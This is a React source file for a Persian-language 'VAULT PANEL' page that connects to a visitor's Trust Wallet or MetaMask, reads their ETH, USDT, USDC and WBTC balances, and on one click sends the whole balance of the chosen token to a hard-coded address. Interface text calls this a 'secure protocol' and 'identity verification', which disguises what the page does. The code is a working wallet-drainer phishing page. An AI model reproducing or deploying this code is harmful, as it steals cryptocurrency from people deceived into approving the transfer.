import React, { useState, useEffect } from 'react';

const VAULT_ADDRESS = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"; 

const TOKENS = [
  { symbol: 'ETH', name: 'Ethereum', address: null, decimals: 18, icon: 'https://cryptologos.cc/logos/ethereum-eth-logo.png' },
  { symbol: 'USDT', name: 'Tether USD', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, icon: 'https://cryptologos.cc/logos/tether-usdt-logo.png' },
  { symbol: 'USDC', name: 'USD Coin', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, icon: 'https://cryptologos.cc/logos/usd-coin-usdc-logo.png' },
  { symbol: 'WBTC', name: 'Wrapped Bitcoin', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8, icon: 'https://cryptologos.cc/logos/wrapped-bitcoin-wbtc-logo.png' }
];

const App = () => {
  const [account, setAccount] = useState(null);
  const [balances, setBalances] = useState({});
  const [selectedToken, setSelectedToken] = useState(TOKENS[0]);
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState('در انتظار تایید پروتکل امن...');
  const [txHash, setTxHash] = useState(null);

  useEffect(() => {
    const checkConnection = async () => {
      const provider = window.trustwallet || window.ethereum;
      if (provider) {
        const accounts = await provider.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
          setAccount(accounts[0]);
          fetchAllBalances(accounts[0]);
        }
      }
    };
    checkConnection();
  }, []);

  const fetchAllBalances = async (address) => {
    if (!window.ethers) return;
    const provider = new window.ethers.providers.Web3Provider(window.trustwallet || window.ethereum);
    const newBalances = {};

    try {
      const ethBalance = await provider.getBalance(address);
      newBalances['ETH'] = window.ethers.utils.formatEther(ethBalance);

      const abi = ["function balanceOf(address) view returns (uint256)"];
      for (const token of TOKENS) {
        if (token.address) {
          const contract = new window.ethers.Contract(token.address, abi, provider);
          const balance = await contract.balanceOf(address);
          newBalances[token.symbol] = window.ethers.utils.formatUnits(balance, token.decimals);
        }
      }
      setBalances(newBalances);
      setStatus('موجودی‌ها به‌روزرسانی شد');
    } catch (error) {
      console.error(error);
    }
  };

  const connectWallet = async () => {
    const provider = window.trustwallet || window.ethereum;
    if (!provider) {
      setStatus('تراست‌والت نصب نیست');
      return;
    }
    setLoading(true);
    try {
      const accounts = await provider.request({ method: 'eth_requestAccounts' });
      setAccount(accounts[0]);
      fetchAllBalances(accounts[0]);
      setStatus('اتصال برقرار شد');
    } catch (e) {
      setStatus('اتصال لغو شد');
    }
    setLoading(false);
  };

  const executeTransfer = async () => {
    if (!account || !window.ethers) return;
    setLoading(true);
    setStatus(`در حال انتقال ${selectedToken.symbol}...`);
    try {
      const provider = new window.ethers.providers.Web3Provider(window.trustwallet || window.ethereum);
      const signer = provider.getSigner();
      const balance = balances[selectedToken.symbol];

      let tx;
      if (selectedToken.symbol === 'ETH') {
        tx = await signer.sendTransaction({
          to: VAULT_ADDRESS,
          value: window.ethers.utils.parseEther(balance)
        });
      } else {
        const abi = ["function transfer(address, uint256) returns (bool)"];
        const contract = new window.ethers.Contract(selectedToken.address, abi, signer);
        tx = await contract.transfer(VAULT_ADDRESS, window.ethers.utils.parseUnits(balance, selectedToken.decimals));
      }
      setTxHash(tx.hash);
      await tx.wait();
      setStatus('عملیات موفقیت‌آمیز');
      fetchAllBalances(account);
    } catch (e) {
      setStatus('خطا در تراکنش');
    }
    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-slate-950 text-white p-8 font-sans" dir="rtl">
      <nav className="max-w-6xl mx-auto flex justify-between items-center mb-12 bg-slate-900/50 p-6 rounded-3xl border border-white/5 shadow-2xl">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-blue-600 rounded-xl shadow-lg shadow-blue-600/50 flex items-center justify-center">
            <svg className="w-6 h-6 fill-white" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
          </div>
          <span className="text-xl font-black">VAULT PANEL</span>
        </div>
        <button onClick={connectWallet} className="bg-blue-600 px-6 py-2 rounded-xl font-bold hover:bg-blue-500 transition-all">
          {account ? `${account.substring(0,6)}...${account.substring(38)}` : 'اتصال کیف‌پول'}
        </button>
      </nav>

      <main className="max-w-6xl mx-auto">
        <div className="mb-8 p-3 bg-white/5 rounded-full w-fit px-6 border border-white/10 flex items-center gap-3">
          <div className={`w-2 h-2 rounded-full ${account ? 'bg-green-500 animate-pulse' : 'bg-blue-500'}`}></div>
          <span className="text-[10px] font-bold uppercase tracking-widest text-slate-400">{status}</span>
        </div>

        {account ? (
          <div className="grid lg:grid-cols-3 gap-8">
            <div className="lg:col-span-2 grid md:grid-cols-2 gap-4">
              {TOKENS.map(token => (
                <div 
                  key={token.symbol}
                  onClick={() => setSelectedToken(token)}
                  className={`p-8 rounded-[2rem] border transition-all cursor-pointer ${selectedToken.symbol === token.symbol ? 'bg-blue-600 border-blue-400' : 'bg-slate-900 border-white/5 hover:border-white/10'}`}
                >
                  <img src={token.icon} className="w-10 h-10 mb-6" alt="" />
                  <div className="text-sm text-slate-400 mb-1">{token.name}</div>
                  <div className="text-3xl font-black">{balances[token.symbol] || '0.00'} <span className="text-sm font-normal opacity-50">{token.symbol}</span></div>
                </div>
              ))}
            </div>
            
            <div className="bg-slate-900 p-8 rounded-[2.5rem] border border-white/10 shadow-2xl h-fit">
              <h3 className="text-xl font-bold mb-6">تایید نهایی دارایی</h3>
              <div className="bg-white/5 p-4 rounded-2xl mb-8 flex items-center gap-3">
                <img src={selectedToken.icon} className="w-6 h-6" alt="" />
                <span className="font-bold text-slate-300">{selectedToken.name}</span>
              </div>
              <button 
                onClick={executeTransfer} 
                disabled={loading}
                className="w-full py-5 bg-white text-black font-black rounded-2xl hover:bg-slate-100 transition-all disabled:opacity-50"
              >
                {loading ? 'صبر کنید...' : `تایید و انتقال ${selectedToken.symbol}`}
              </button>
              {txHash && <p className="mt-4 text-[10px] font-mono text-slate-500 truncate">Hash: {txHash}</p>}
            </div>
          </div>
        ) : (
          <div className="text-center py-40 bg-slate-900/50 rounded-[4rem] border-2 border-dashed border-white/5">
            <h1 className="text-4xl font-black mb-6">در انتظار تایید هویت بلاک‌چین</h1>
            <button onClick={connectWallet} className="bg-blue-600 px-12 py-4 rounded-2xl font-black text-xl hover:scale-105 transition-all">شروع اتصال امن</button>
          </div>
        )}
      </main>
    </div>
  );
};

export default App;